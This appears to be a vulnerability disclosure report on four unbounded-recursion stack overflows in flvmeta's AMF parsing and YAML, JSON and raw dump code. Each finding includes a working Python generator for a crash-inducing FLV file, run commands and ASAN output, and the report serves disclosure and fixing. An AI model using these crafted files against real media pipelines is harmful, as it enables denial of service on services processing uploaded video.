# flvmeta Vulnerabilities

## Bug1: Stack overflow via unbounded mutual recursion in AMF array parsing

In `amf_data_read()` and `amf_array_read()` in `src/amf.c`, the two functions call each other recursively with no depth limit so a crafted FLV script tag containing 70 000 levels of nested AMF strict-arrays exhausts the 8 MB thread stack and causes a SIGSEGV crash.

### PoC

Craft a malicious FLV file using the Python script below and process it with the ASAN-instrumented flvmeta binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
PoC generator for flvmeta stack overflow via unbounded recursion in AMF parsing.

Trigger path:
  flvmeta main() -> flv_parse() -> flv_read_metadata() -> amf_data_file_read()
    -> amf_data_read() -> amf_array_read() -> (loop) -> amf_data_read()
    -> amf_array_read() -> ... [unbounded mutual recursion]
"""

import struct
import sys

DEPTH = 70000
OUTPUT = "poc_input.flv"


def build_amf_payload(depth: int) -> bytes:
    """Build deeply nested AMF strict-array payload followed by a leaf number."""
    # AMF string "onMetaData": type 0x02 + 2-byte length + UTF-8 bytes
    name = b"onMetaData"
    amf_name = b"\x02" + struct.pack(">H", len(name)) + name

    # Nested strict-arrays: each level = 0x0A + uint32_BE(1)
    nested = b"\x0a" + struct.pack(">I", 1)
    arrays = nested * depth

    # Leaf: AMF number 0.0 (type 0x00 + 8-byte IEEE-754 double = 0.0)
    leaf = b"\x00" + b"\x00" * 8

    return amf_name + arrays + leaf


def build_flv(payload: bytes) -> bytes:
    """Wrap the AMF payload in a valid FLV file."""
    # FLV header: signature + version(1) + flags(5=audio+video) + header_size(9)
    flv_header = b"FLV" + b"\x01" + b"\x05" + struct.pack(">I", 9)

    # First previous_tag_size (always 0 at start)
    prev_tag_size_0 = struct.pack(">I", 0)

    # Script tag: type 0x12 (script data), 3-byte data size, timestamp, stream id
    tag_type = b"\x12"
    data_size = len(payload)
    tag_data_size = struct.pack(">I", data_size)[1:]  # 3 bytes big-endian
    timestamp = b"\x00\x00\x00"
    ts_ext = b"\x00"
    stream_id = b"\x00\x00\x00"

    script_tag = tag_type + tag_data_size + timestamp + ts_ext + stream_id + payload

    # Previous tag size after script tag = 11 (tag header) + data_size
    prev_tag_size_1 = struct.pack(">I", 11 + data_size)

    return flv_header + prev_tag_size_0 + script_tag + prev_tag_size_1


def main():
    out_path = OUTPUT
    if len(sys.argv) > 1:
        out_path = sys.argv[1]

    print(f"[*] Building AMF payload with {DEPTH} nested strict-arrays...")
    payload = build_amf_payload(DEPTH)
    print(f"[*] AMF payload size: {len(payload)} bytes")

    flv_data = build_flv(payload)
    print(f"[*] Total FLV size: {len(flv_data)} bytes")

    with open(out_path, "wb") as f:
        f.write(flv_data)
    print(f"[+] Written to: {out_path}")


if __name__ == "__main__":
    main()
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/src/flvmeta poc_input.flv || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==1849313==ERROR: AddressSanitizer: stack-overflow on address 0x7fffa06f4ff0 (pc 0x7fd8906de8c1 bp 0x000000000000 sp 0x7fffa06f4fe0 T0)
SUMMARY: AddressSanitizer: stack-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_stackdepot.cpp:54 in __sanitizer::StackDepotNode::hash(__sanitizer::StackTrace const&)

### Impact

An attacker who supplies a crafted FLV file with deeply nested AMF strict-arrays can crash the flvmeta process through uncontrolled stack exhaustion, constituting a reliable denial-of-service condition. The attack surface includes any pipeline or service that invokes flvmeta on untrusted input, such as media upload handlers and video processing workflows. No heap or buffer-overflow primitive is produced so the immediate impact is limited to process termination, though environments where stack canaries or guard pages are absent could theoretically allow further exploitation.

<!-- REPORT_SOURCE: src_dump_yaml_c#001 -->
<!-- DEDUP: amf_data_read::CWE-674 -->

## Bug2: Uncontrolled Recursion in amf_data_dump Causes Stack Overflow

`amf_data_dump()` in `amf.c` (called from `dump_raw.c:124`) imposes no recursion depth limit when traversing nested AMF containers, and each stack frame reserves a 128-byte `datestr` local buffer, so a crafted FLV script tag with roughly 4,000 levels of nested AMF objects exhausts the default 8 MB Linux stack and crashes the process.

### PoC

Craft a malicious FLV file using the Python script below and process it with the ASAN-instrumented flvmeta binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
PoC generator: Uncontrolled Recursion in amf_data_dump
CWE-674: Uncontrolled Recursion

Crafts a FLV file with a Script Tag containing deeply nested AMF objects
to trigger stack exhaustion in amf_data_dump() during the dump phase.
"""

import struct

OUTPUT = "poc_input.flv"
DEPTH = 4000  # Each amf_data_dump frame allocates 128-byte datestr; 4000 levels overflow

# ---- Build deeply nested AMF structure (iterative, no Python recursion) ----

# Innermost value: AMF number 1.0
inner = b"\x00" + struct.pack(">d", 1.0)

# Wrap in DEPTH levels of AMF objects
# AMF object: 0x03 + key-value pairs + 0x00 0x00 0x09 (end marker)
# Key format: uint16 BE length + bytes (no type byte for key)
# Value format: type byte + data
for i in range(DEPTH):
    key = b"\x00\x01" + b"a"  # key "a", length 1
    inner = b"\x03" + key + inner + b"\x00\x00\x09"

# Outermost "onMetaData" ecma_array wrapping
# AMF ecma_array: 0x08 + uint32 BE count + key-value pairs + 0x00 0x00 0x09
key_outer = b"\x00\x04" + b"meta"
amf_body = b"\x08" + struct.pack(">I", 1) + key_outer + inner + b"\x00\x00\x09"

# Full AMF data for script tag
# AMF string: 0x02 + uint16 BE length + bytes
amf_name = b"\x02" + struct.pack(">H", 10) + b"onMetaData"
tag_data = amf_name + amf_body

# ---- Assemble FLV file ----

# FLV header: signature + version 1 + flags (audio+video) + header size 9
flv_header = b"FLV" + b"\x01" + b"\x05" + b"\x00\x00\x00\x09"

# Previous tag size before first tag = 0
prev_tag_size_0 = b"\x00\x00\x00\x00"

# Script tag (type 0x12 = 18)
tag_type = b"\x12"
data_size = len(tag_data)
tag_data_size = struct.pack(">I", data_size)[1:]  # 3 bytes BE
timestamp = b"\x00\x00\x00"
timestamp_extended = b"\x00"
stream_id = b"\x00\x00\x00"

script_tag = (
    tag_type
    + tag_data_size
    + timestamp
    + timestamp_extended
    + stream_id
    + tag_data
)

# Previous tag size = 11 (tag header) + data_size
prev_tag_size_1 = struct.pack(">I", 11 + data_size)

flv_bytes = flv_header + prev_tag_size_0 + script_tag + prev_tag_size_1

# ---- Write output ----
with open(OUTPUT, "wb") as f:
    f.write(flv_bytes)

print(f"[+] Written {len(flv_bytes)} bytes to {OUTPUT}")
print(f"[+] AMF nesting depth: {DEPTH}")
print(f"[+] Expected crash: stack overflow in amf_data_dump() during dump phase")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/src/flvmeta poc_input.flv || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: stack-overflow on address 0x7ffc848efff8 (pc 0x7f2c91fe0660 bp 0x7f2c92170780 sp 0x7ffc848f0000 T0)
    #0 0x7f2c91fe0660 in _IO_new_file_xsputn libio/fileops.c:1235
    #1 0x7f2c91fe0660 in _IO_new_file_xsputn libio/fileops.c:1196

### Impact

An attacker who supplies a crafted FLV file with approximately 4,000 levels of nested AMF objects can cause flvmeta to exhaust its stack during the metadata dump phase, producing an unconditional denial of service via SIGSEGV. The attack surface covers any pipeline or service that invokes flvmeta on untrusted FLV input, and no authentication or special privilege is required. On builds without stack canaries or guard pages, the uncontrolled stack growth may overwrite adjacent memory regions and could potentially lead to arbitrary code execution.

<!-- REPORT_SOURCE: src_dump_raw_c#002 -->
<!-- DEDUP: amf_data_dump::CWE-674 -->

## Bug3: Stack Overflow via Unbounded Recursion in amf_data_read and json_amf_data_dump

The mutually recursive functions `amf_data_read()` and `amf_object_read()` in `amf.c` and the self-recursive function `json_amf_data_dump()` in `dump_json.c` impose no recursion depth limit, allowing a crafted FLV Script tag with deeply nested AMF objects to exhaust the thread stack and crash the process with SIGSEGV.

### PoC

Craft a malicious FLV file using the Python script below and process it with the ASAN-instrumented flvmeta binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

NESTING_DEPTH = 50000
OUTPUT_FILE = "poc_input.flv"


def build_nested_amf(depth):
    # Innermost value: AMF number 0.0 (type 0x00 + 8 zero bytes)
    data = b"\x00" + b"\x00" * 8

    # Each wrapper layer: 0x03 (object) + key "a" + inner value + end marker
    key = b"\x00\x01" + b"a"
    end_marker = b"\x00\x00\x09"

    for _ in range(depth):
        data = b"\x03" + key + data + end_marker

    return data


def build_flv(amf_payload):
    # FLV header: signature + version + flags + header_size (9)
    flv_header = b"FLV" + b"\x01" + b"\x05" + struct.pack(">I", 9)

    # First previous_tag_size = 0
    prev_tag_size_0 = struct.pack(">I", 0)

    # Script tag (type 0x12)
    tag_type = b"\x12"
    data_size = struct.pack(">I", len(amf_payload))[1:]  # 3 bytes big-endian
    timestamp = b"\x00\x00\x00"
    timestamp_ext = b"\x00"
    stream_id = b"\x00\x00\x00"

    script_tag = (tag_type + data_size + timestamp + timestamp_ext +
                  stream_id + amf_payload)

    # previous_tag_size for script tag = 11 (header bytes) + payload length
    prev_tag_size_1 = struct.pack(">I", 11 + len(amf_payload))

    return flv_header + prev_tag_size_0 + script_tag + prev_tag_size_1


# AMF0 string "onMetaData": type 0x02 + uint16_BE length + bytes
on_metadata = b"\x02" + struct.pack(">H", len("onMetaData")) + b"onMetaData"

# Deeply nested AMF object as the metadata value
nested_obj = build_nested_amf(NESTING_DEPTH)

amf_payload = on_metadata + nested_obj
flv_data = build_flv(amf_payload)

with open(OUTPUT_FILE, "wb") as f:
    f.write(flv_data)

print(f"Written {len(flv_data)} bytes to {OUTPUT_FILE}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/src/flvmeta poc_input.flv || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: stack-overflow on address 0x7ffd5a674ff8 (pc 0x7fc90de6a886 bp 0x000000000000 sp 0x7ffd5a675000 T0)
    #0 0x7fc90de6a886 in __sanitizer::StackDepotBase<__sanitizer::StackDepotNode, 1, 20>::Put(__sanitizer::StackTrace, bool*) sanitizer_stackdepotbase.h:100
    #1 0x7fc90de6a3cb in __sanitizer::StackDepotPut(__sanitizer::StackTrace) sanitizer_stackdepot.cpp:98
SUMMARY: AddressSanitizer: stack-overflow sanitizer_stackdepotbase.h:100 in __sanitizer::StackDepotBase<__sanitizer::StackDepotNode, 1, 20>::Put(__sanitizer::StackTrace, bool*)

### Impact

An attacker who can supply a crafted FLV file can trigger unbounded mutual recursion between `amf_data_read()` and `amf_object_read()`, exhausting the 8 MB default thread stack and crashing the process with SIGSEGV, constituting a reliable denial of service. The attack requires only a ~350 KB FLV file with 50,000 levels of nested AMF objects, well within the 16 MB Script tag size limit, and no authentication or special privileges. In server-side video processing pipelines that invoke flvmeta automatically, any user with file upload access can remotely crash the service with a single request.

<!-- REPORT_SOURCE: src_dump_json_c#001 -->
<!-- DEDUP: `amf_data_read::CWE-674 -->

## Bug4: Stack overflow via unbounded recursion in amf_data_yaml_dump

The function `amf_data_yaml_dump` in `dump_yaml.c` recursively processes every element of AMF_TYPE_ARRAY structures without any recursion depth limit, so a crafted FLV script tag with deeply nested strict-arrays exhausts the process stack and causes a fatal stack-overflow crash.

### PoC

Craft a malicious FLV file using the Python script below and process it with the ASAN-instrumented flvmeta binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTPUT_FILE = "poc_input.flv"
DEPTH = 35000

def build_amf_payload(depth):
    key = b"\x02" + struct.pack(">H", len("onMetaData")) + b"onMetaData"
    nested = b""
    for _ in range(depth):
        nested += b"\x0a" + struct.pack(">I", 1)
    leaf = b"\x00" + b"\x00" * 8
    return key + nested + leaf

def build_flv(payload_bytes):
    flv_header = b"FLV" + b"\x01" + b"\x05" + struct.pack(">I", 9)
    prev_tag_size_0 = struct.pack(">I", 0)
    tag_type = b"\x12"
    data_size = len(payload_bytes)
    data_size_bytes = struct.pack(">I", data_size)[1:]
    timestamp = b"\x00\x00\x00"
    timestamp_ext = b"\x00"
    stream_id = b"\x00\x00\x00"
    tag_header = tag_type + data_size_bytes + timestamp + timestamp_ext + stream_id
    tag = tag_header + payload_bytes
    prev_tag_size_1 = struct.pack(">I", 11 + data_size)
    return flv_header + prev_tag_size_0 + tag + prev_tag_size_1

payload = build_amf_payload(DEPTH)
flv_data = build_flv(payload)
with open(OUTPUT_FILE, "wb") as f:
    f.write(flv_data)
print(f"[+] Written {len(flv_data)} bytes to {OUTPUT_FILE}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/src/flvmeta poc_input.flv || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==1849691==ERROR: AddressSanitizer: stack-overflow on address 0x7ffd10232ff8 (pc 0x7ff31d8266c8 bp 0x000000000010 sp 0x7ffd10233000 T0)
    #0 0x7ff31d8266c8 in __asan::GetCurrentThread() ../../../../src/libsanitizer/asan/asan_thread.cpp:421
    #1 0x7ff31d78f43d in __asan::Allocator::Allocate(unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType, bool) ../../../../src/libsanitizer/asan/asan_allocator.cpp:533
SUMMARY: AddressSanitizer: stack-overflow ../../../../src/libsanitizer/asan/asan_thread.cpp:421 in __asan::GetCurrentThread()

### Impact

An attacker who supplies a crafted FLV file with approximately 35,000 levels of nested AMF strict-arrays can cause flvmeta to crash with SIGSEGV due to stack exhaustion, resulting in denial of service. The attack surface is any deployment where flvmeta processes untrusted FLV input, such as automated media transcoding or metadata extraction pipelines. No authentication or special privileges are required; a single malformed file reliably reproduces the crash.

<!-- REPORT_SOURCE: src_dump_yaml_c#002 -->
<!-- DEDUP: amf_data_yaml_dump::CWE-674 -->
